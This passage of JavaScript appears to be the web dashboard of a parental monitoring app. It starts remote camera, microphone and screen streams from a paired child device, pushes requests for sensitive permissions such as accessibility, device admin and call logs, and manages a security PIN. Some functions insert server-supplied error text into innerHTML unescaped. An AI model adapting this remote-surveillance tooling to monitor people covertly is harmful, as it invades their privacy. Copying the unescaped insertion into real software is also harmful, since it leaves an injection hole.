  };
  
  streamSocket.onclose = (event) => {
    console.log('WebSocket closed:', event.reason);
    if (streamTimeout) {
      clearTimeout(streamTimeout);
      streamTimeout = null;
    }
    if (currentStreamType && !streamStarted) {
      showStreamError(type, permissions);
    } else if (currentStreamType) {
      streamVideo.innerHTML = '<p class="connecting">Connection closed. Click Stop to exit.</p>';
    }
  };
}

function showStreamError(type, permissions, specificError = null) {
  const streamVideo = document.getElementById('streamVideo');
  let errorMessage = '';
  let suggestion = '';
  
  // Determine the exact cause
  if (specificError) {
    errorMessage = specificError;
  } else if (type === 'camera') {
    if (!permissions.camera) {
      errorMessage = 'Camera permission not granted on child device';
      suggestion = 'Click "Request Permission" to ask for camera access.';
    } else {
      errorMessage = 'Device not responding to camera stream request';
      suggestion = 'The device might be locked, app might be killed, or camera is in use by another app.';
    }
  } else if (type === 'audio') {
    if (!permissions.microphone) {
      errorMessage = 'Microphone permission not granted on child device';
      suggestion = 'Click "Request Permission" to ask for microphone access.';
    } else {
      errorMessage = 'Device not responding to audio stream request';
      suggestion = 'The device might be locked, app might be killed, or microphone is in use.';
    }
  } else if (type === 'screen') {
    errorMessage = 'Screen mirroring requires user interaction';
    suggestion = 'MediaProjection permission must be granted directly on the device. The child device user needs to tap "Allow" when prompted.';
  } else {
    errorMessage = 'Stream failed to start after multiple attempts';
    suggestion = 'Check if the device is online and the app is running.';
  }
  
  const permissionBtn = (type === 'camera' && !permissions.camera) 
    ? `<button class="btn btn-primary" onclick="requestPermissionFromStream('camera')">Request Camera Permission</button>`
    : (type === 'audio' && !permissions.microphone)
    ? `<button class="btn btn-primary" onclick="requestPermissionFromStream('microphone')">Request Microphone Permission</button>`
    : '';
  
  streamVideo.innerHTML = `
    <div class="stream-error-detail">
      <i class="material-icons error-icon">error_outline</i>
      <h3>Stream Failed</h3>
      <p class="error-message">${errorMessage}</p>
      <p class="error-suggestion">${suggestion}</p>
      <div class="error-actions">
        ${permissionBtn}
        <button class="btn btn-secondary" onclick="retryStream('${type}')">Retry</button>
      </div>
      <div class="error-debug">
        <small>Device Online: ${selectedDevice?.isOnline ? 'Yes' : 'No'}</small><br>
        <small>Last Seen: ${selectedDevice?.lastSeen ? formatTime(selectedDevice.lastSeen) : 'Unknown'}</small><br>
        <small>Camera Permission: ${permissions.camera ? 'Yes' : 'No'}</small><br>
        <small>Microphone Permission: ${permissions.microphone ? 'Yes' : 'No'}</small>
      </div>
    </div>
  `;
}

function showStreamErrorMessage(message, type, permissions) {
  const streamVideo = document.getElementById('streamVideo');
  streamVideo.innerHTML = `
    <div class="stream-error-detail">
      <i class="material-icons error-icon">error_outline</i>
      <h3>Stream Error</h3>
      <p class="error-message">${message}</p>
      <div class="error-actions">
        <button class="btn btn-secondary" onclick="retryStream('${type}')">Retry</button>
      </div>
    </div>
  `;
}

function requestPermissionFromStream(permissionType) {
  requestPermission(permissionType);
  stopStream();
}

function retryStream(type) {
  stopStream();
  setTimeout(() => startStream(type), 500);
}

// Handle incoming stream data
function handleStreamData(data, type) {
  const streamVideo = document.getElementById('streamVideo');
  
  if (type === 'audio') {
    // Audio stream - would need Web Audio API
    if (!streamVideo.querySelector('.audio-indicator')) {
      streamVideo.innerHTML = '<div class="audio-indicator"><i class="material-icons">hearing</i><p>Receiving audio...</p></div>';
    }
  } else {
    // Video/Camera stream - handle JPEG frames or JSON messages
    if (typeof data === 'string') {
      try {
        const msg = JSON.parse(data);
        if (msg.type === 'camera_frame' && msg.frame) {
          // Display JPEG frame as image
          displayVideoFrame(msg.frame);
        } else if (msg.type === 'stream_started') {
          streamVideo.innerHTML = '<p class="connecting">Stream started, waiting for frames...</p>';
        } else if (msg.type === 'error') {
          streamVideo.innerHTML = `<p class="error">Error: ${msg.error}</p>`;
        }
      } catch (e) {
        // Not JSON, might be raw data
        console.log('Non-JSON message received');
      }
    } else if (data instanceof Blob) {
      // Binary data - convert to image
      const reader = new FileReader();
      reader.onload = () => {
        const base64 = reader.result.split(',')[1];
        displayVideoFrame(base64);
      };
      reader.readAsDataURL(data);
    }
  }
}

// Display a video frame from base64 JPEG
function displayVideoFrame(base64Data) {
  const streamVideo = document.getElementById('streamVideo');
  
  // Create or update image element
  let img = streamVideo.querySelector('.stream-image');
  if (!img) {
    streamVideo.innerHTML = '';
    img = document.createElement('img');
    img.className = 'stream-image';
    img.style.cssText = 'max-width: 100%; max-height: 100%; object-fit: contain;';
    streamVideo.appendChild(img);
  }
  
  img.src = 'data:image/jpeg;base64,' + base64Data;
}

let currentStreamType = null;

function stopStream() {
  if (streamSocket) {
    streamSocket.close();
    streamSocket = null;
  }
  
  document.getElementById('streamModal').classList.add('hidden');
  
  // Send appropriate stop command based on stream type
  const stopCommands = {
    screen: 'stop_screen_mirror',
    camera: 'stop_camera',
    audio: 'stop_live_listen'
  };
  
  if (currentStreamType && stopCommands[currentStreamType]) {
    sendCommand(stopCommands[currentStreamType]);
  }
  currentStreamType = null;
}

// Ring device with stop option
let isRinging = false;

function ringDevice() {
  if (isRinging) {
    sendCommand('stop_ring');
    document.getElementById('btnRingDevice').innerHTML = '<i class="material-icons">notifications_active</i> Ring Device';
    isRinging = false;
  } else {
    sendCommand('ring_device');
    document.getElementById('btnRingDevice').innerHTML = '<i class="material-icons">notifications_off</i> Stop Ring';
    isRinging = true;
    // Auto-reset after 30 seconds
    setTimeout(() => {
      if (isRinging) {
        document.getElementById('btnRingDevice').innerHTML = '<i class="material-icons">notifications_active</i> Ring Device';
        isRinging = false;
      }
    }, 30000);
  }
}

// Pairing
function showPairingModal() {
  document.getElementById('pairingModal').classList.remove('hidden');
  generatePairingCode();
}

function hidePairingModal() {
  document.getElementById('pairingModal').classList.add('hidden');
}

async function generatePairingCode() {
  try {
    const data = await api('/auth/pairing-code', { method: 'POST' });
    document.getElementById('pairingCode').textContent = data.code;
    
    // Start countdown - handle both number and string formats
    let seconds = typeof data.expiresIn === 'number' ? data.expiresIn : 5 * 60; // default 5 min
    const expiryEl = document.getElementById('codeExpiry');
    
    const interval = setInterval(() => {
      seconds--;
      const mins = Math.floor(seconds / 60);
      const secs = seconds % 60;
      expiryEl.textContent = `${mins}:${secs.toString().padStart(2, '0')}`;
      
      if (seconds <= 0) {
        clearInterval(interval);
        document.getElementById('pairingCode').textContent = '------';
        expiryEl.textContent = 'Expired';
      }
    }, 1000);
  } catch (error) {
    alert('Failed to generate pairing code: ' + error.message);
  }
}

// Device Selection
function handleDeviceChange() {
  const deviceId = deviceSelector.value;
  selectedDevice = devices.find(d => getDeviceId(d) === deviceId) || null;
  refreshData();
}

function refreshData() {
  const currentPage = document.querySelector('.nav-item.active')?.dataset.page || 'dashboard';
  navigateTo(currentPage);
}

// Utility Functions
function formatTime(timestamp) {
  if (!timestamp) return 'Unknown';
  
  const date = new Date(timestamp);
  const now = new Date();
  const diff = now - date;
  
  if (diff < 60000) return 'Just now';
  if (diff < 3600000) return `${Math.floor(diff / 60000)}m ago`;
  if (diff < 86400000) return `${Math.floor(diff / 3600000)}h ago`;
  
  return date.toLocaleDateString();
}

function formatDuration(minutes) {
  if (!minutes) return '0m';
  
  const hours = Math.floor(minutes / 60);
  const mins = Math.round(minutes % 60);
  
  if (hours > 0) {
    return `${hours}h ${mins}m`;
  }
  return `${mins}m`;
}

function getAppIcon(packageName) {
  const icons = {
    'com.whatsapp': '<i class="fab fa-whatsapp" style="color:#25D366"></i>',
    'com.instagram.android': '<i class="fab fa-instagram" style="color:#E4405F"></i>',
    'org.telegram.messenger': '<i class="fab fa-telegram" style="color:#0088cc"></i>',
    'com.facebook.orca': '<i class="fab fa-facebook-messenger" style="color:#0078FF"></i>',
    'com.facebook.katana': '<i class="fab fa-facebook" style="color:#1877F2"></i>',
    'com.twitter.android': '<i class="fab fa-twitter" style="color:#1DA1F2"></i>',
    'com.snapchat.android': '<i class="fab fa-snapchat" style="color:#FFFC00"></i>',
  };
  
  return icons[packageName] || '<i class="fas fa-bell"></i>';
}

// ========== PERMISSIONS DISPLAY ==========
async function loadPermissions() {
  if (!selectedDevice) return;
  
  try {
    const data = await api(`/devices/${getDeviceId(selectedDevice)}`);
    const permissions = data.device.permissions || {};
    
    // Update permission status in UI
    const permissionElements = document.querySelectorAll('[data-permission]');
    let grantedCount = 0;
    let totalCount = 0;
    
    permissionElements.forEach(el => {
      const permName = el.dataset.permission;
      const statusEl = el.querySelector('.permission-status');
      const isGranted = permissions[permName] === true;
      
      if (statusEl) {
        statusEl.textContent = isGranted ? 'Granted' : 'Denied';
        statusEl.className = `permission-status ${isGranted ? 'granted' : 'denied'}`;
      }
      
      // Update the permission item class for styling the button
      if (isGranted) {
        el.classList.add('granted');
      } else {
        el.classList.remove('granted');
      }
      
      totalCount++;
      if (isGranted) grantedCount++;
    });
    
    // Update last updated time
    const lastUpdatedEl = document.getElementById('permissionsLastUpdated');
    if (lastUpdatedEl) {
      if (permissions.lastUpdated) {
        lastUpdatedEl.textContent = `Last updated: ${formatTime(permissions.lastUpdated)}`;
      } else if (data.device.lastSeen) {
        lastUpdatedEl.textContent = `Last updated: ${formatTime(data.device.lastSeen)}`;
      }
    }
    
    console.log(`Permissions: ${grantedCount}/${totalCount} granted`);
  } catch (error) {
    console.error('Failed to load permissions:', error);
  }
}

// Request a specific permission from child device
async function requestPermission(permissionName) {
  if (!selectedDevice) {
    alert('Please select a device first');
    return;
  }
  
  const permissionMap = {
    'location': 'request_location_permission',
    'backgroundLocation': 'request_background_location_permission',
    'camera': 'request_camera_permission',
    'microphone': 'request_microphone_permission',
    'callLog': 'request_call_log_permission',
    'notifications': 'request_notification_permission',
    'usageStats': 'request_usage_stats_permission',
    'overlay': 'request_overlay_permission',
    'batteryOptimization': 'request_battery_optimization_permission',
    'deviceAdmin': 'request_device_admin_permission',
    'accessibility': 'request_accessibility_permission',
    'storage': 'request_storage_permission'
  };
  
  const command = permissionMap[permissionName] || `request_${permissionName}_permission`;
  
  try {
    await sendCommand(command, { permission: permissionName });
    alert(`Permission request sent to device. The user will be prompted to grant "${permissionName}" permission.`);
  } catch (error) {
    alert('Failed to send permission request: ' + error.message);
  }
}

// Request all missing permissions
async function requestAllMissingPermissions() {
  if (!selectedDevice) {
    alert('Please select a device first');
    return;
  }
  
  try {
    await sendCommand('request_all_permissions');
    alert('Request sent to device. The user will be guided through granting all missing permissions.');
  } catch (error) {
    alert('Failed to send request: ' + error.message);
  }
}

// ========== SECURITY PIN MANAGEMENT ==========
let currentPinAction = 'set'; // 'set', 'change', 'remove'

async function checkPinStatus() {
  try {
    const data = await api('/auth/has-pin');
    const hasPin = data.hasPinSet;
    
    const statusBadge = document.querySelector('.pin-status .pin-badge');
    const btnSet = document.getElementById('btnSetPin');
    const btnChange = document.getElementById('btnChangePin');
    const btnRemove = document.getElementById('btnRemovePin');
    
    if (hasPin) {
      if (statusBadge) {
        statusBadge.textContent = 'PIN Set';
        statusBadge.className = 'pin-badge has-pin';
      }
      if (btnSet) btnSet.classList.add('hidden');
      if (btnChange) btnChange.classList.remove('hidden');
      if (btnRemove) btnRemove.classList.remove('hidden');
    } else {
      if (statusBadge) {
        statusBadge.textContent = 'No PIN';
        statusBadge.className = 'pin-badge no-pin';
      }
      if (btnSet) btnSet.classList.remove('hidden');
      if (btnChange) btnChange.classList.add('hidden');
      if (btnRemove) btnRemove.classList.add('hidden');
    }
  } catch (error) {
    console.error('Failed to check PIN status:', error);
  }
}

function showPinModal(action) {
  currentPinAction = action;
  const modal = document.getElementById('pinModal');
  const title = document.getElementById('pinModalTitle');
  const currentPinGroup = document.getElementById('currentPinGroup');
  const newPinGroup = document.getElementById('newPinGroup');
  const confirmPinGroup = document.getElementById('confirmPinGroup');
  const saveBtn = document.getElementById('btnSavePin');
  
  // Clear inputs
  document.getElementById('currentPin').value = '';
  document.getElementById('newPin').value = '';
  document.getElementById('confirmPin').value = '';
  document.getElementById('pinError').classList.add('hidden');
  
  switch(action) {
    case 'set':
      title.textContent = 'Set Security PIN';
      currentPinGroup.classList.add('hidden');
      newPinGroup.classList.remove('hidden');
      confirmPinGroup.classList.remove('hidden');
      saveBtn.textContent = 'Set PIN';
      break;
    case 'change':
      title.textContent = 'Change Security PIN';
      currentPinGroup.classList.remove('hidden');
      newPinGroup.classList.remove('hidden');
      confirmPinGroup.classList.remove('hidden');
      saveBtn.textContent = 'Change PIN';
      break;
    case 'remove':
      title.textContent = 'Remove Security PIN';
      currentPinGroup.classList.remove('hidden');
      newPinGroup.classList.add('hidden');
      confirmPinGroup.classList.add('hidden');
      saveBtn.textContent = 'Remove PIN';
      break;
  }
  
  modal.classList.remove('hidden');
}

function hidePinModal() {
  document.getElementById('pinModal').classList.add('hidden');
}

function showPinError(message) {
  const errorEl = document.getElementById('pinError');
  errorEl.textContent = message;
  errorEl.classList.remove('hidden');
}

async function handlePinSave() {
  const currentPin = document.getElementById('currentPin').value;
  const newPin = document.getElementById('newPin').value;
  const confirmPin = document.getElementById('confirmPin').value;
  
  // Validation
  if (currentPinAction !== 'remove') {
    if (!newPin || newPin.length < 4 || newPin.length > 8) {
      showPinError('PIN must be 4-8 digits');
      return;
    }
    if (!/^\d+$/.test(newPin)) {
      showPinError('PIN must contain only numbers');
      return;
    }
    if (newPin !== confirmPin) {
      showPinError('PINs do not match');
      return;
    }
  }
  
  if ((currentPinAction === 'change' || currentPinAction === 'remove') && !currentPin) {
    showPinError('Please enter current PIN');
    return;
  }
  
  try {
    if (currentPinAction === 'set') {
      await api('/auth/security-pin', {
        method: 'POST',
        body: JSON.stringify({ pin: newPin })
      });
      alert('Security PIN set successfully!');
    } else if (currentPinAction === 'change') {
      await api('/auth/security-pin', {
        method: 'POST',
        body: JSON.stringify({ currentPin, pin: newPin })
      });
      alert('Security PIN changed successfully!');
    } else if (currentPinAction === 'remove') {
      await api('/auth/security-pin', {
        method: 'DELETE',
        body: JSON.stringify({ pin: currentPin })
      });
      alert('Security PIN removed successfully!');
    }
    
    hidePinModal();
    checkPinStatus();
  } catch (error) {
    showPinError(error.message || 'Failed to update PIN');
  }
}

// Setup PIN event listeners
document.addEventListener('DOMContentLoaded', () => {
  // PIN buttons
  const btnSetPin = document.getElementById('btnSetPin');
  const btnChangePin = document.getElementById('btnChangePin');
  const btnRemovePin = document.getElementById('btnRemovePin');
  const btnSavePin = document.getElementById('btnSavePin');
  const btnCancelPin = document.getElementById('btnCancelPin');
  const closePinModal = document.getElementById('closePinModal');
  
  if (btnSetPin) btnSetPin.addEventListener('click', () => showPinModal('set'));
  if (btnChangePin) btnChangePin.addEventListener('click', () => showPinModal('change'));
  if (btnRemovePin) btnRemovePin.addEventListener('click', () => showPinModal('remove'));
  if (btnSavePin) btnSavePin.addEventListener('click', handlePinSave);
  if (btnCancelPin) btnCancelPin.addEventListener('click', hidePinModal);
  if (closePinModal) closePinModal.addEventListener('click', hidePinModal);
});

